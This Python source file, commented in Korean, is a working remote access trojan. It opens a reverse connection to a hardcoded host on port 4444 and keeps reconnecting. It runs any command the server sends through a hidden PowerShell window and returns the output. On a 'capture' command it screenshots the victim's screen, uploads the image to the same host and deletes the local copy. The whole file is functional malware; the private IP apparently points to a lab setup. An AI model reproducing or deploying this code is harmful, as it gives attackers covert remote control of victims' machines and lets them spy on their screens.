import socket  # 네트워크 소켓 통신을 위한 모듈
import subprocess  # 외부 프로세스 실행을 위한 모듈
import time  # 시간 관련 기능을 위한 모듈
from PIL import ImageGrab  # 스크린샷을 캡처하기 위한 모듈
from pathlib import Path  # 파일 경로 작업을 위한 모듈
import requests  # HTTP 요청을 위한 모듈
import tempfile  # 임시 파일 및 디렉토리 작업을 위한 모듈
import os  # 운영 체제 관련 기능을 위한 모듈
from datetime import datetime  # 날짜 및 시간 작업을 위한 모듈

# 서버의 IP 주소와 포트를 설정
ip_addr = "192.168.186.128"
port = 4444


# 스크린샷을 캡처하고 저장하는 함수
def capture_and_save_screenshot():
    try:
        # 스크린샷을 캡처
        screenshot = ImageGrab.grab()
        # 현재 날짜와 시간을 "YYYYMMDD_HHMMSS" 형식의 문자열로 변환
        current_datetime = datetime.now().strftime("%Y%m%d_%H%M%S")
        # 캡처한 스크린샷의 파일 이름 생성
        screenshot_filename = f"screenshot_{current_datetime}.png"
        # 임시 디렉토리에 파일 경로 설정
        screenshot_path = os.path.join(tempfile.gettempdir(), screenshot_filename)
        # 스크린샷을 PNG 파일로 저장
        screenshot.save(screenshot_path, "PNG")
        # 저장된 경로를 출력
        print(f"Screenshot captured and saved to: {screenshot_path}")
        # 스크린샷 경로 반환
        return screenshot_path
    except Exception as e:
        # 스크린샷 캡처 중 예외 발생 시 오류 메시지 출력
        print(f"Error capturing screenshot: {e}")
        # 실패 시 None 반환
        return None


#
# 캡처한 이미지를 서버로 전송하고 파일을 삭제하는 함수
def send_image_and_delete(image_path, upload_url):
    try:
        # 이미지 파일을 읽기 모드로 열기
        with open(image_path, "rb") as file:
            # 파일을 포함한 딕셔너리 생성
            files = {"file": (Path(image_path).name, file)}
            # 이미지 파일을 서버로 전송
            response = requests.post(upload_url, files=files)
            # 요청이 성공했는지 확인
            response.raise_for_status()
            # 서버 응답 출력
            print(response.text)

        # 파일이 닫힌 후(with 블록 외부) 삭제를 진행합니다.
        os.remove(image_path)
        # 파일 삭제 메시지 출력
        print(f"Image file {image_path} deleted.")
    except requests.RequestException as e:
        # HTTP 요청 예외 발생 시 오류 메시지 출력
        print(f"Error sending image: {e}")
    except OSError as e:
        # 파일 삭제 예외 발생 시 오류 메시지 출력
        print(f"Error deleting image: {e}")


#
# PowerShell 명령어를 실행하고 결과를 반환하는 함수
def execute_powershell_command(command):
    try:
        # PowerShell 실행 파일 경로 설정
        powershell_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        # PowerShell 명령어 실행
        proc = subprocess.Popen(
            [powershell_path, command],  # 실행할 명령어 리스트
            stdout=subprocess.PIPE,  # 표준 출력 파이프 설정
            stderr=subprocess.PIPE,  # 표준 오류 파이프 설정
            stdin=subprocess.PIPE,  # 표준 입력 파이프 설정
            text=True,  # 텍스트 모드로 설정
            creationflags=subprocess.CREATE_NO_WINDOW,  # 창을 생성하지 않도록 설정
        )
        # 명령 실행 후 출력 및 오류 수집
        stdout, stderr = proc.communicate()
        # 출력과 오류를 합쳐서 반환
        return stdout + stderr
    except Exception as e:
        # 명령 실행 중 예외 발생 시 오류 메시지 반환
        return f"Error executing command: {e}"


#
# 메인 함수, 서버와의 연결을 유지하며 명령어를 처리
def main():
    # 이미지 업로드를 위한 URL 설정
    upload_url = f"http://{ip_addr}/upload.php"
    # 무한 루프를 통해 지속적으로 서버와 연결 시도
    while True:
        # 클라이언트 소켓 생성
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            # 서버에 연결 시도
            client_socket.connect((ip_addr, port))
            print("Connected to the server!")
            # 서버와의 통신을 위한 루프
            while True:
                try:
                    # 서버로부터 데이터 수신
                    data = client_socket.recv(4096)
                    # 수신한 데이터가 없으면 루프 종료
                    if not data:
                        break
                    # 수신한 명령 출력
                    print(f"Received command: {data}")
                    # 'capture' 명령을 수신한 경우
                    if data == b"capture\n":
                        # 스크린샷 캡처 및 저장
                        saved_screenshot_path = capture_and_save_screenshot()
                        # 스크린샷이 성공적으로 저장되었을 경우
                        if saved_screenshot_path:
                            # 스크린샷 전송 및 삭제
                            send_image_and_delete(saved_screenshot_path, upload_url)
                    else:
                        # 그 외의 명령어일 경우
                        # 명령어를 UTF-8로 디코딩하고 공백 제거
                        command = data.decode("utf-8").strip()
                        # PowerShell 명령어 실행
                        result = execute_powershell_command(command)
                        # 실행 결과를 서버로 전송
                        client_socket.sendall(result.encode())
                except Exception as e:
                    # 통신 중 예외 발생 시 오류 메시지 출력
                    print(f"Error: {e}")
                    break
        except Exception as e:
            # 서버 연결 중 예외 발생 시 오류 메시지 출력
            print(f"Connection error: {e}")
            print("Retrying in 3 seconds...")
            # 3초 대기 후 재시도
            time.sleep(3)
        finally:
            # 클라이언트 소켓 닫기
            client_socket.close()
            print("Disconnected from the server.")


#
# 스크립트가 직접 실행될 경우 메인 함수 호출
if __name__ == "__main__":
    main()
